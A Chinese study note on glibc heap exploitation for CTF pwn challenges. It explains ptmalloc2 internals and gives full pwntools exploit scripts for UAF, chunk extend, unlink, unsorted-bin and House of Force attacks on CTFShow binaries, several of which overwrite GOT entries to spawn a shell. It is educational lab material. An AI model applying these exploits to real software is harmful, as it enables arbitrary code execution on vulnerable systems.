堆（heap），pwn的一道分水岭，各种教程都会叽里呱啦说一堆东西和名词，一时半会还是看不懂，还是边做题边学。
https://www.anquanke.com/post/id/163971#h2-1
# 基础概念
但话说回来，一些基础概念还是要知道的。
## 堆概述
首先，堆（Heap）是虚拟地址空间的一块连续的线性区域，提供动态分配的内存，允许程序申请大小未知的内存，它在用户与操作系统之间，作为动态内存管理的中间人。同时堆响应用户的申请内存请求，向操作系统申请内存，然后将其返回给用户程序，管理用户所释放的内存，并在合适的时候还给操作系统。
简单来说，堆主要是指用户动态申请的内存（如调用malloc、alloc、alloca、new等函数）。
目前有以下几种内存分配器：
- Dlmalloc-General purpose allocator
- **ptmalloc2-glibc** (重点)
- Jemalloc-Firefox    
- Tcmalloc-chrome   
- ...
CTF比赛中有关堆的PWN题大多是基于Linux的ptmalloc2-glibc堆块管理机制的。因此目前学的都是该管理器。
![[Pasted image 20250227153925.png]]
堆管理器并非由操作系统实现，而是由libc.so.6链接库实现。封装了一些系统调用，为用户提供方便的动态内存分配接口的同时，力求高效地管理由系统调用申请来的内存，申请内存的系统调用有brk和mmap两种。
1. brk是将数据段(.data)的最高地址指针_edata往高地址推。（_edata指向数据段的最高地址）
2. mmap是在进程的虚拟地址空间中（堆和栈中间，称为文件映射区域的地方）找一块空闲的虚拟内存。
这两种方式分配的都是虚拟内存，没有分配物理内存。在第一次访问已分配的虚拟地址空间的时候，发生缺页中断，操作系统负责分配物理内存，然后建立虚拟内存和物理内存之间的映射关系。malloc小于128k的内存时，glibc使用brk分配内存；大于128k时，使用mmap分配内存，在堆和栈之间找一块空闲内存分配。第一次执行malloc可能出现的系统调用如下。
![[Pasted image 20250227154039.png]]
## Arena
（翻译了一下这个单词是竞技场的意思，感觉怪怪的，还是叫他的原文吧）
一个线程申请的1个或多个堆包含很多的信息：二进制位信息，多个malloc_chunk信息等这些堆需要东西来进行管理，那么Arena就是来管理线程中的这些堆的，也可以理解为堆管理器所持有的内存池。

操作系统-->堆管理器-->用户
物理内存--> arena -> 可用内存

堆管理器与用户的内存交易发生于arena中，可以理解为堆管理器向操作系统批发来的有冗余的内存库存。
一个线程只有一个arnea，并且这些线程的arnea都是独立的不是相同的
主线程的arnea称为“main_arena”。子线程的arnea称为“thread_arena”。
主线程无论一开始malloc多少空间，只要size<128KB，kernel都会给132KB的heap segment(rw)。这部分称为main arena。 main_arena 并不在申请的 heap 中，而是一个全局变量，在 libc.so 的数据段。
![[Pasted image 20250227154705.png]]
![[Pasted image 20250227154720.png]]
后续的申请的内存会一直从这个arena中获取，直到空间不足。当arena空间不足时，它可以通过增加brk的方式来增加堆的空间。类似地，arena也可以通过减小brk来缩小自己的空间。
即使将所有main arena所分配出去的内存块free完，也不会立即还给kernel，而是交由glibc来管理。当后面程序再次申请内存时，在glibc中管理的内存充足的情况下，glibc就会根据堆分配的算法来给程序分配相应的内存。

总结一下就是说，Arena是管理一个线程内所有堆块的，不同的线程有不同的Arena独立管理，以及首次申请堆的时候哪怕很小都会直接给132KB的容量。
### malloc_chunk
​ glibc malloc源码中有三种最基本的堆块数据结构，分别为heap_info、malloc_state、malloc_chunk，为了使问题简单化，这里着重介绍单线程的malloc_chunk。
在程序的执行过程中，我们称由 malloc 申请的内存为 chunk 。这块内存在 ptmalloc 内部用 malloc_chunk 结构体来表示。当程序申请的 chunk 被 free 后，会被加入到相应的空闲管理列表中。
无论一个 chunk 的大小如何，处于分配状态还是释放状态，它们都使用一个统一的结构。
​ malloc_chunk 的结构如下：
```C
struct malloc_chunk {
  
INTERNAL_SIZE_T   prev_size; /* Size of previous chunk (if free). */
INTERNAL_SIZE_T   size;    /* Size in bytes, including overhead. */
  
struct malloc_chunk* fd;     /* double links -- used only if free. */
struct malloc_chunk* bk;
  
  /* Only used for large blocks: pointer to next larger size. */
  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
  struct malloc_chunk* bk_nextsize;
};
```
一般来说，size_t 在 64 位中是 64 位无符号整数，32 位中是 32 位无符号整数。
每个字段的具体的解释如下：
- **prev_size**, 如果该 chunk 的物理相邻的前一地址 chunk是空闲的话，那该字段记录的是前一个 chunk 的大小 (包括 chunk 头)。否则，该字段可以用来存储物理相邻的前一个 chunk 的数据。这里的前一 chunk 指的是较低地址的 chunk 。
- **size**，该 chunk 的大小，大小必须是 2 * SIZE_SZ 的整数倍。如果申请的内存大小不是 2 * SIZE_SZ 的整数倍，会被转换满足大小的最小的 2 * SIZE_SZ 的倍数。
  其中，32 位系统中，SIZE_SZ 是 4；64 位系统中，SIZE_SZ 是 8。 该字段的低三个比特位对 chunk 的大小没有影响，它们从高到低分别表示。
- NON_MAIN_ARENA，记录当前 chunk 是否不属于主线程，1 表示不属于，0 表示属于。
- IS_MAPPED，记录当前 chunk 是否是由 mmap 分配的。
- PREV_INUSE，记录前一个 chunk 块是否被分配。一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲 chunk 之间的合并。
![[Pasted image 20250227160049.png]]

结合实际题目看一下
![[Pasted image 20250303171628.png]]
这边刚创建完一个堆，指针指向0x804b1a0
![[Pasted image 20250303171857.png]]
高亮处是size，由于没有前一个堆块，所以可以发现pre size字段没有指向，可以看出这个堆块是由mmap(malloc)分配的，且前一堆块被占用。
## C++下的堆
### 虚函数
PolarCTF 2025的garden
C++中为了实现多态，会在new一个类的时候创建一个虚函数表，里面存放着这个类的所有的方法，这个虚函数表的指针存在堆的第一位，
![[Pasted image 20250428093147.png]]
虚函数表一般都是可读不可修改的
![[Pasted image 20250428093448.png]]
漏洞的利用也很简单，如果可以修改虚函数表的指针，就可以劫持，比如劫持到bss段自制的虚函数表让其执行如ogg之类的

# 漏洞利用
## UAF and fastbins
UAF(use after free)即使用释放后的指针，这是一种漏洞，指堆被释放后指向该堆的指针没有被赋为NULL，这会导致程序错误，若是该指针指向的位置被修改为其他函数，则可以控制程序。
fastbins，是堆被free后指向头部的指针存放的位置，当分配一块较小的内存(mem<=64 Bytes)时，会首先检查对应大小的fastbin中是否包含未被使用的chunk，如果存在则直接将其从fastbin中移除并返回；否则通过其他方式（剪切top chunk）得到一块符合大小要求的chunk并返回。
fastbins有两个特性
**1.使用单链表来维护释放的堆块**  
也就是和上图一样，从main_arena 到 free 第一个块的地方是采用单链表形式进行存储的，若还有 free 掉的堆块，则这个堆块的 fk 指针域就会指针前一个堆块。


**2.采用后进先出的方式维护链表（类似于栈的结构）**  
当程序需要重新 malloc 内存并且需要从fastbin 中挑选堆块时，**会选择后面新加入的堆块拿来先进行内存分配**
![[Pasted image 20250316201533.png]]
如上图，如果程序重新请求和上面的堆块大小一样时候（malloc），堆管理器就会直接使用 fast bin 里的堆块。

**这里的话也就是直接使用第二次释放的这个堆块，然后将这个堆块从链表中移除，接着根据堆块的 fk 指针找到这个堆块**，此时 main_arena 就指向了这里。也就是恢复到了上面第一个图中的情况。

这里用CTFshow里的[CTFShow-pwn141](https://ctf.show/challenges#pwn141-4160)来测试
![[Pasted image 20250316201715.png]]
这是一道典型的UAF的题目，有创建，删除，输出三个函数，
add_notes函数，将堆指针存在notelist中
![[Pasted image 20250316202332.png]]
del_notes函数，free堆块，但没有清除notelist里的指针，这就导致了UAF漏洞
![[Pasted image 20250316202347.png]]
print_note函数，调用notelist指向的函数，那么只要让notelist指向的函数指向为backdoors即可。
![[Pasted image 20250316202927.png]]
这里看一下`add_notes`函数，先用了`malloc(8)`来存放`print`的地址，然后在`malloc(__size)`来存放我们输入的`context`，所以要`free`两次生成两个堆存放在fastbins里，然后再申请堆时，`malloc(8)`会用第一次`free`的堆，`malloc(__size)`会用第二次`free`的堆
exp:
```python
from pwn import *

context(arch='i386', os='linux', log_level='debug')
ip, port = 'pwn.challenge.ctf.show:28176'.split(':')
local = False
if local:
	p = process('./pwn141')
else:
	p = remote(ip, int(port))

def add_note(size, content):
	p.recvuntil(b'choice :')
	p.sendline(b'1')
	p.recvuntil(b'Note size :')
	p.sendline(size)
	p.recvuntil(b'Content :')
	p.send(content)

def del_note(idx):
	p.recvuntil(b'choice :')
	p.sendline(b'2')
	p.recvuntil(b'Index :')
	p.sendline(idx)

def print_note(idx):
	p.recvuntil(b'choice :')
	p.sendline(b'3')
	p.recvuntil(b'Index :')
	p.sendline(idx)

backdoors = 0x8049684
add_note(b'16', b'aaaa')
add_note(b'16', b'bbbb')
del_note(b'0')
del_note(b'1')
add_note(b'8', p32(backdoors))
print_note(b'0')

p.interactive()
```
## Chunk Extand
chunk extend 是堆漏洞的一种常见利用手法，通过 extend 可以实现 chunk overlapping 的效果。这种利用方法需要以下的时机和条件：
- 程序中存在基于堆的漏洞
- 漏洞可以控制 chunk header 中的数据
简单来说，通过修改一个`chunk`的`size`域，然后再`free`该`chunk`，会导致`free`的大小改变，此时在`malloc`一个该`size`大小的`chunk`，就可以控制该`chunk`的全部内容。就可以控制执行原有的指向被覆盖的`chunk`的指针。
这里用CTFshow的[CTFShow-pwn142](https://ctf.show/challenges#pwn142-4161)来试验。
![[Pasted image 20250316211240.png]]
经典的增删查改四个函数，漏洞在`edit`中，可以多写一字节的内容
![[Pasted image 20250316211343.png]]
那么这多出来的一字节，就可以用来修改下一个`chunk`的`size`
![[Pasted image 20250316211843.png]]
这里我们申请了`0x18`大小的`chunk`，可以看到下一个`chunk`的`size`我们是可以修改的
![[Pasted image 20250316211954.png]]
这里我们就需要计算一下，因为`size`修改后的值需要与后面`chunk`大小之和相同
![[Pasted image 20250316213611.png]]
`create_heap`函数中可以看到`malloc`了两个`chunk`，第一个`chunk`大小固定，存的是第二`chunk`的大小和地址，第二个`chunk`的大小就是申请的大小
![[Pasted image 20250323145909.png]]
这里我们`free`后可以看到`free`了两个`chunk`，一个是大小固定的`chunk`，另一个是我们修改了`size`后的`chunk`大小，所以我们再申请一个大小的`0x50`(因为还要算上`size`域这些所以要小`0x10`)的`chunk`,那么就可以覆盖到下一个`chunk`。
![[Pasted image 20250323150324.png]]
这里可以看到新申请的`chunk`以及我们申请的大小为`0x50`的`chunk`都申请成功，且我们可以修改两个`chunk`的指针，把指向`chunk`的指针修改为任意函数的`got`后执行`show`就可以泄漏`libc`，然后再用`edit`就可以修改该函数的`got`。
例如我们这里获取`free`的`got`并修改其为`system`，然后再申请一个新`chunk`里面存的是`/bin/sh`，然后`free`这个`chunk`就相当于执行`system("/bin/sh")`
exp:
```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
ip, port = 'pwn.challenge.ctf.show:28176'.split(':')
elf_path = './pwn142'
libc_path = './libc-2.27.so'
local = True
debug = True
debug_word = '''
	b create_heap
	b edit_heap
	b show_heap
	b delete_heap
'''
if local:
	p = process(elf_path)
	if debug:
		gdb.attach(p, debug_word)
else:
	p = remote(ip, int(port))


def choose(choice):
	p.recvuntil(b'choice :')
	p.sendline(str(choice))

def create_heap(size, content):
	choose(1)
	p.recvuntil(b'Size of Heap : ')
	p.sendline(str(size))
	p.recvuntil(b'Content of heap:')
	p.send(content)

def edit_heap(idx, content):
	choose(2)
	p.recvuntil(b'Index :')
	p.sendline((str(idx)))
	p.recvuntil(b'Content of heap : ')
	p.send(content)

def show_heap(idx):
	choose(3)
	p.recvuntil(b'Index :')
	p.sendline((str(idx)))

def delete_heap(idx):
	choose(4)
	p.recvuntil(b'Index :')
	p.sendline(str(idx))

elf = ELF(elf_path)
libc = ELF(libc_path)

create_heap(0x18, b'aaaa')
create_heap(0x10, b'bbbb')
create_heap(0x10, b'cccc')
edit_heap(0, b'a'*0x18 + p64(0x61))
delete_heap(1)
create_heap(0x50, b'bbbb')
edit_heap(1, b'\x00'*0x38 + p64(0x21) + p64(0x51) + p64(elf.got['free']))
show_heap(2)
p.recvuntil(b'Content : ')
free_addr = u64(p.recv(6).ljust(8, b'\x00'))
log.success('free_addr: ' + hex(free_addr))
libc_base = free_addr - libc.symbols['free']
system_addr = libc_base + libc.symbols['system']
ogg = [0x45216,0x4526a,0xf02a4,0xf1147]
# edit_heap(2, p64(libc_base + ogg[3]))
edit_heap(2, p64(system_addr))
create_heap(0x18, b'/bin/sh\x00')
delete_heap(3)
  
p.interactive()
```
## Unlink
unlink存在于大于fastbins大小的heap中，其目的是把一个双向链表中的空闲块拿出来（例如 free 时和目前物理相邻的 free chunk 进行合并）。其基本的过程如下
![[Pasted image 20250323162721.png]]
在free某个大小不属于fast bin的在使用的堆块P时，会触发合并操作，检查前后两个物理相邻堆块P1、P2是不是空闲，如果是空闲，就把P1/P2从原本所在的bin中unlink出来，然后跟P合并，合并后放入unsorted bin中。

unlink操作的关键一步是，FD=P->fd,BK=P->bk,FD->bk=BK,BK->fd=FD

如果把将要unlink的那个堆块（即P）的fd和bk指针修改了， FD指向需要改变值的地址，BK指向想要改成的值，当FD->bk=BK后，就实现了值的篡改。但是注意，FD->bk=FD-12(32位，size+prevsize+fd各四位)，所以篡改的地址应该要-12，这样才能实现正确的指向。

但是这样只有在低版本中行得通，高版本中新增了检查，在unlink前，先确定FD->bk=P，BK->fd=P，以防止伪造chunk。这样的话上面的办法明显就通不过检查了。于是有了另一种思路：（32位）

既然要保证FD->bk=P，BK->fd=P，那就直接让FD=P-12,BK=P-8就行了，这样

FD->bk=FD+12=P

BK->fd=BK+8=P

就绕过了检测，执行完unlink后，FD->bk=BK,BK->fd=FD,最后就是P=P-12，P指针指向了比自己低12处。
我们要做的是伪造一个chunk，
![[Pasted image 20250323165202.png]]
```python
fakechunk = p64(0) + p64(0x41) + p64(fd) + p64(bk)
fakechunk += b'\x00' * 0x20 + p64(0x40) + p64(0x90)
```
这里的fakechunk中，0x41是当前将会被unlink的伪造出来的chunk的size，后面的0x40则是presize，用于说明前一个chunk是空闲的，0x90是当前chunk的大小
![[Pasted image 20250323165215.png]]
![[Pasted image 20250323165319.png]]
可以看到free后chunk被合并为一个0xd1大小的chunk,同时看list这边chunk的指针已经被修改，之后再edit该chunk就能泄漏libc基址并修改got表来获取shell。
![[Pasted image 20250323165417.png]]
exp:
```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
ip, port = 'pwn.challenge.ctf.show:28149'.split(':')
elf_path = './pwn143'
libc_path = './libc-2.23.so'
local = True
debug = False
debug_word = '''
	b add
	b edit
	b show
	b delete
'''
if local:
	p = process(elf_path)
	if debug:
		gdb.attach(p, debug_word)
else:
	p = remote(ip, int(port))

def choose(choice):
	p.sendlineafter(b'choice:', str(choice))

def create_heap(size, content):
	choose(2)
	p.sendlineafter(b'length:', str(size))
	p.sendafter(b'name:', content)

def edit_heap(idx, size, content):
	choose(3)
	p.sendlineafter(b'index:', str(idx))
	p.sendlineafter(b'name:', str(size))
	p.sendafter(b'name:', content)

def show_heap():
	choose(1)

def delete_heap(idx):
	choose(4)
	p.sendlineafter(b'index:', str(idx))

def exit():
	choose(5)

elf = ELF(elf_path)
libc = ELF(libc_path)
backdoors = 0x400d7f

create_heap(0x40, b'aaaa')
create_heap(0x80, b'bbbb')
create_heap(0x80, b'cccc')
create_heap(0x10, b'/bin/sh\x00')

ptr = 0x6020a8
fd = ptr - 0x18
bk = ptr - 0x10
fakechunk = p64(0) + p64(0x41) + p64(fd) + p64(bk)
fakechunk += b'\x00' * 0x20 + p64(0x40) + p64(0x90)
edit_heap(0, len(fakechunk), fakechunk)
delete_heap(1)

payload = b'\x00' * 0x10 + p64(0x40) + p64(elf.got['free'])
edit_heap(0, len(payload), payload)
show_heap()

p.recvuntil(b'0 : ')
free_addr = u64(p.recv(6).ljust(8, b'\x00'))
libc.address = free_addr - libc.symbols['free']
system_addr = libc.symbols['system']
binsh_addr = next(libc.search(b'/bin/sh'))
log.info(f'free_addr: {hex(free_addr)}')
log.info(f'system_addr: {hex(system_addr)}')

edit_heap(0, 0x8, p64(system_addr))
delete_heap(3)

pause()  

p.interactive()
```

## teache bin
### 概念
![[Pasted image 20250609151836.png]]
这是**tcache 保护下的堆利用**，glibc 2.29+（或开启了 safe-linking）后，tcache 链表的 fd 指针会被加密，保护机制如下：

> tcache entry 的 fd 实际存储的是：  
> **fd = 下一个chunk地址 ^ (heap_base >> 12)**
### teache poisoning
即修改 teache 中的 next ，不需要伪造任何 chunk 结构即可实现 malloc 到任意地址~~，不过在 2.29 后加入了 key 指针，构造的时候需要注意 key 小于 0 后就不会在 bins 中提取地址来作为 malloc 的位置。~~
总体而言和 fast bins attack 类似，但不像 fast bins attack 一样需要位置上有一个符合 fast bins 条件的 size 。


## Fast bin
fastbin
释放前 
![[Pasted image 20250427152358.png]]
释放后
![[Pasted image 20250427152401.png]]
![[Pasted image 20250427152405.png]]
### Fastbin Double Free
如果连续两次free同一个fastbin chunk，会触发double free检测导致报错，但若是先 free chunk1 再 free chunk2 ，然后再 free chunk1 则不会报错，同时还会使 fastbin 的链表变成下面这样
![[Pasted image 20250427152408.png]]
原因在与
	1. fastbin 的 chunk 被 free 后 next_chunk 的 pre_inuse 位不会被清空
	2. fastbin 在执行 free 的时候仅验证了 main_arena 直接指向的块，即链表指针头部的块。对于链表后面的块，并没有进行验证。
注意因为 chunk1 被再次释放因此其 fd 值不再为 0 而是指向 chunk2，这时如果我们可以控制 chunk1 的内容，便可以写入其 fd 指针从而实现在我们想要的任意地址分配 fastbin 块。 例如构造一个上面这样的 fastbin 链表，malloc chunk1 后，将 chunk1 的 fd 修改为我们编造的在其他位置(比如在  bss 段构造的一个 fake chunk )的 fake chunk(**注意该 fake chunk 的 size域需要与当前 fastbin 链表应有的 size 相符**)，然后再次申请到 chunk1 的时候就可以申请到 fake chunk 的位置，之后就可以修改 fake chunk 里的内容，实现任意写的需求。
### House of Spirit
House of Spirit 是 `the Malloc Maleficarum` 中的一种技术。
该技术的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配**指定地址**的 chunk 的目的。
要想构造 fastbin fake chunk，并且将其释放时，可以将其放入到对应的 fastbin 链表中，需要绕过一些必要的检测，即
- fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理。
- fake chunk 地址需要对齐， MALLOC_ALIGN_MASK
- fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐。
- fake chunk 的 next chunk 的大小不能小于 `2 * SIZE_SZ`，同时也不能大于`av->system_mem` 。
- fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。
![[Pasted image 20250427152415.png]]
即对于有如上这样一个区域，我们利用可控区域1和可控区域2，构造一个符合 fastbin 条件的 chunk 然后 free 他，之后再申请这个 chunk ，这样就可以控制目标区域内的内容
### Alloc to Stack
劫持 fastbin 的 fd 去栈上(**前提是栈上有对应的size值**)，malloc 后就会获得一个在栈上的 chunk 从而可以覆盖返回变量之类的。
### Arbitrary Alloc
和 Alloc to Stack 完全一样，区别就是 Arbitrary Alloc 是将 fastbin 的 fd 劫持到任意目标地址有size域的地址，从而修改对于地址。
比如可以分配 fastbin 到 `_malloc_hook` 的位置，相当于覆盖 `_malloc_hook`来控制程序流程

## Unsorted bin
### 什么是unsorted bin
首先看一下unsorted bin是什么
unsorted bin 可以视为空闲 `chunk` 回归其所属 bin 之前的缓冲区。
#### 基本来源
1. 当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中。
2. 释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。关于 top chunk 的解释，请参考下面的介绍。
3. 当进行 malloc_consolidate 时，可能会把合并后的 chunk 放到 unsorted bin 中，如果不是和 top chunk 近邻的话。
#### 基本使用情况 
1. Unsorted Bin 在使用的过程中，采用的遍历顺序是 FIFO，**即插入的时候插入到 unsorted bin 的头部，取出的时候从链表尾获取**。
2. 在程序 malloc 时，如果在 fastbin，small bin 中找不到对应大小的 chunk，就会尝试从 Unsorted Bin 中寻找 chunk。如果取出来的 chunk 大小刚好满足，就会直接返回给用户，否则就会把这些 chunk 分别插入到对应的 bin 中。
### Unsorted bin leak
#### Unsorted Bin 的结构
`Unsorted Bin` 在管理时为循环双向链表，若 `Unsorted Bin` 中有两个 `bin`，那么该链表结构如下
![[Pasted image 20250330164144.png]]
在gdb中看看
![[Pasted image 20250330170320.png]]
我们可以看到，在该链表中必有一个节点（不准确的说，是尾节点，这个就意会一下把，毕竟循环链表实际上没有头尾）的 `fd` 指针会指向 `main_arena` 结构体内部。
#### Leak 原理
如果我们可以把正确的 `fd` 指针 leak 出来，就可以获得一个与 `main_arena` 有固定偏移的地址，这个偏移可以通过调试得出。而`main_arena` 是一个 `struct malloc_state` 类型的全局变量，是 `ptmalloc` 管理主分配区的唯一实例。说到全局变量，立马可以想到他会被分配在 `.data` 或者 `.bss` 等段上，那么如果我们有进程所使用的 `libc` 的 `.so` 文件的话，我们就可以获得 `main_arena` 与 `libc` 基地址的偏移，实现对 `ASLR` 的绕过。
有两种方法取得`main_arena`与`libc`基址的偏移
##### 通过 __malloc_trim 函数得出
在 `malloc.c` 中有这样一段代码
```
int __malloc_trim (size_t s) 
{   
	int result = 0;    
	if (__malloc_initialized < 0)    
		ptmalloc_init ();    
	mstate ar_ptr = &main_arena;//<=here!   
	do     
	{       
		__libc_lock_lock (ar_ptr->mutex);       
		result |= mtrim (ar_ptr, s);       
		__libc_lock_unlock (ar_ptr->mutex);        
		ar_ptr = ar_ptr->next;     
	}  while (ar_ptr != &main_arena);    
	return result; 
}
```
注意到 `mstate ar_ptr = &main_arena;` 这里对 `main_arena` 进行了访问，所以我们就可以通过 IDA 等工具分析出偏移了。
![[Pasted image 20250330171026.png]]
比如把 `.so` 文件放到 IDA 中，找到 `malloc_trim` 函数，就可以获得偏移了。
ghidra里面没找到，不知道是不是没函数名的原因还是别的原因
##### 通过 __malloc_hook 直接算出
比较巧合的是，`main_arena` 和 `__malloc_hook` 的地址差是 0x10，而大多数的 libc 都可以直接查出 `__malloc_hook` 的地址，这样可以大幅减小工作量。以 pwntools 为例

`main_arena_offset = ELF("libc.so.6").symbols["__malloc_hook"] + 0x10`

这样就可以获得 `main_arena` 与基地址的偏移了。

### Unsorted bin attack
在 (glibc/malloc/malloc.c) 中的 `_int_malloc` 有这么一段代码，当将一个 unsorted bin 取出的时候，会将 `bck->fd` 的位置写入本 Unsorted Bin 的位置。
```
/* remove from unsorted list */ 
if (__glibc_unlikely (bck->fd != victim)) 
	malloc_printerr ("malloc(): corrupted unsorted chunks 3"); unsorted_chunks (av)->bk = bck;
bck->fd = unsorted_chunks (av);
```
换而言之，如果我们控制了 bk 的值，我们就能将 `unsorted_chunks (av)` 写到任意地址。
这里我们用[CTFShow-pwn144](https://ctf.show/challenges#pwn144-4163)为例
![[Pasted image 20250330180852.png]]
这里我们修改`unsorted bin`的`bk`为`magic - 0x10`，然后malloc(0x80)来将该bin用起来
![[Pasted image 20250330181048.png]]![[Pasted image 20250330181058.png]]
可以看到magic的值成功被改变。
这里我们可以看出虽然用unsorted bin attack可以修改任意地址的内容，但修改的值不是我们能控制的。

这看起来似乎并没有什么用处，但是其实还是有点卵用的，比如说
- 我们通过修改循环的次数来使得程序可以执行多次循环。
- 我们可以修改 heap 中的 global_max_fast 来使得更大的 chunk 可以被视为 fast bin，这样我们就可以去执行一些 fast bin attack 了。
exp:
```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
ip, port = 'pwn.challenge.ctf.show:28217'.split(':')
elf_path = './pwn144'
libc_path = ''
local = True
debug = True
debug_word = '''
	b create_heap
	b edit_heap
	b delete_heap
'''
if local:
	p = process(elf_path)
	if debug:
		gdb.attach(p, debug_word)
else:
	p = remote(ip, int(port))

def choose(choice):
	p.sendlineafter(b'choice :', str(choice))

def create_heap(size, content):
	choose(1)
	p.sendlineafter(b'Heap : ', str(size))
	p.sendafter(b'heap:', content)

def edit_heap(idx, size, content):
	choose(2)
	p.sendlineafter(b'Index :', str(idx))
	p.sendlineafter(b'Heap : ', str(size))
	p.sendafter(b'heap : ', content)

def show_heap():
	choose(1)

def delete_heap(idx):
	choose(3)
	p.sendlineafter(b'Index :', str(idx))

def exit():
	choose(4)

def to_backdoor():
	p.sendafter(b'choice :', b'114514')

magic = 0x6020a0

create_heap(0x20, b'a' * 0x20)
create_heap(0x80, b'b' * 0x80)
create_heap(0x20, b'c' * 0x20)
delete_heap(1)
fd = 0
bk = magic - 0x10
edit_heap(0, 0x20 + 0x20, b'd' * 0x20 + p64(0) + p64(0x91) + p64(fd) + p64(bk))
create_heap(0x80, b'dada')
pause()
to_backdoor()

p.interactive()
```
## large bin
https://bbs.kanxue.com/thread-273418.htm
### 概念
large_bin是一种堆分配的管理方式，是**双向链表**，用于管理大于某个特定大小阈值的内存块。**一般而言，进入large_bin的最低字节为0x200(512)**。但由于引入了tcache_bin，使得**在tcache_bin尚未填满的情况下，进入large_bin的最低字节为0x410(1040)**，所以一般我们设置大堆块都是0x410起步。
在 free 一个 unsorted bin 后再申请一个大于该 unsorted bin 的 chunk，这个unsorted bin 就会进入 large bin，当然这个 chunk 的大小要符合 large bin 的大小。
### large bin attack
首先 large bin 可以泄漏 libc 基址和 heap 基址
![[Pasted image 20250531115700.png]]
其次，在largebin插入的过程中，伪造largebin的bk_nextsize以及bk，实现任意地址写堆地址。
1. 整体攻击思路就是申请一大一小两个chunk(后面称为chunk1，chunk2)，先free掉chunk1，然后申请一个更大的chunk来将chunk1从unsortedbin中插入到largebin，接着将chunk1的bk_nextsize设置为target_addr-0x20
2. free掉chunk2，然后申请一个更大的chunk来将chunk2从unsortedbin中插入到largebin中，由于此时插入的chunk2的size要小于chunk1，所以会触发攻击流程
#### 2.30之前
1.首先需要把一个可控的堆块送入largebin，设为chunk1
2.利用uaf或者其他手段，修改chunk1的bk为trtarget_addr1-0x10,chunk1的bk_nextsize修改为target_addr2-0x20。
3.再free一个属于largebin范围的chunk2，然后malloc一个大堆块，就能做到largebin_attack。
#### 2.30之后
由于添加了两个检查，只能任意写一个地址，即bk_nextsize修改为target_addr-0x20即可任意写一个地址。

## House of XXX
### House of Force
**在开始之前，首先要强调，该漏洞的使用对libc版本有要求，即仅能在libc2.23-2.29的版本使用该漏洞**
~~看的几篇文章都没有说过这一点导致调试了半天，都怀疑是surfacepro可怜的4G的内存不够用导致的malloc失败~~
`House of Force(HOF)`,是一种堆利用方法，利用该漏洞需要满足下面条件:
-  能够以溢出等方式控制到`top chunk`的`size`域
-  能够自由控制堆分配尺寸的大小
HOF产生的条件是由于`glibc`对`top chunk`的处理，进行堆分配时，如果所有空闲的块都无法满足需求，那么就会从`top chunk`中分割出对应的大小作为堆块的空间，那么当`top chunk`的`size`值是由用户控制的任意值时就可以使`top chunk`指向我们期望的任何位置，这就相当于一次任意地址写。
一般而言将`size`值修改为-1(因为在比较时会把size值转化为无符号数，此时-1就是最大值)。
这里用例题[CTFShow-pwn143](https://ctf.show/challenges#pwn143-4162)来练习：
首先可以看到有增删查改四个函数，修改部分可以自定义输入的长度，导致可以堆溢出修改`top chunk`的`size`。
这里我们用堆溢出修改size为`-1(0xffffffffffffffff)`，然后再`malloc(-0x60)`，这样就可以让`top chunk`的指针往回指，而本题开辟的第一个`chunk`里存放的就是`hello_message`和`goodbye_message`的地址，后续调用时也是调用这个`chunk`里存的函数，那么我们只需要将这个`chunk`里的函数地址修改为`backdoors`的地址，再调用`exit`，就可以执行`backdoors`。
![[Pasted image 20250323155525.png]]
可以看到现在的top chunk指的是0x16fc1050，也就是正常位置
![[Pasted image 20250323155622.png]]
![[Pasted image 20250323155703.png]]
执行后可以看到top chunk修改到了heap段的头部，此时我们申请一个新的chunk就能覆盖hello_message和goodbye_message。
```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
ip, port = 'pwn.challenge.ctf.show:28149'.split(':')
elf_path = './pwn143'
libc_path = './libc-2.23.so'
local = True
debug = True
debug_word = '''
	b add
	b edit
	b show
	b delete
'''
if local:
	p = process(elf_path)
	if debug:
		gdb.attach(p, debug_word)
else:
	p = remote(ip, int(port))

def choose(choice):
	p.recvuntil(b'choice:')
	p.sendline(str(choice))

def create_heap(size, content):
	choose(2)
	p.recvuntil(b'length:')
	p.sendline(str(size))
	p.recvuntil(b'name:')
	p.send(content)

def edit_heap(idx, size, content):
	choose(3)
	p.recvuntil(b'index:')
	p.sendline((str(idx)))
	p.recvuntil(b'name:')
	p.sendline(str(size))
	p.recvuntil(b'name:')
	p.send(content)

def show_heap():
	choose(1)

def delete_heap(idx):
	choose(4)
	p.recvuntil(b'index:')
	p.sendline(str(idx))

def exit():
	choose(5)

elf = ELF(elf_path)
libc = ELF(libc_path)[[#C++下的堆]]
backdoors = 0x400d7f

create_heap(0x20, b'aaaa')
edit_heap(0, 0x30, b'a'*0x28 + p64(0xffffffffffffffff))
create_heap(-0x50 - 0x8, b'bbbb')
create_heap(0x10, p64(backdoors) * 2)
exit()

p.interactive()
```

### House of Apple
#轩辕杯
知识点来源：
https://www.roderickchan.cn/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-1/
#### 使用条件
1. 程序从main函数返回或能调用能够exit函数
2. 能泄漏出heap地址和libc地址
3. 能使用一次largebin attack
#### 使用原理
当程序从`main`函数返回或者执行`exit`函数的时候，均会调用`fcloseall`函数，该调用链为：
- exit
	- fcloseall
		- IOcleanup
			- IOflushalllockp
			    - IOOVERFLOW
最后会遍历`_IO_list_all`存放的每一个`IO_FILE`结构体，如果满足条件的话，会调用每个结构体中`vtable->_overflow`函数指针指向的函数。
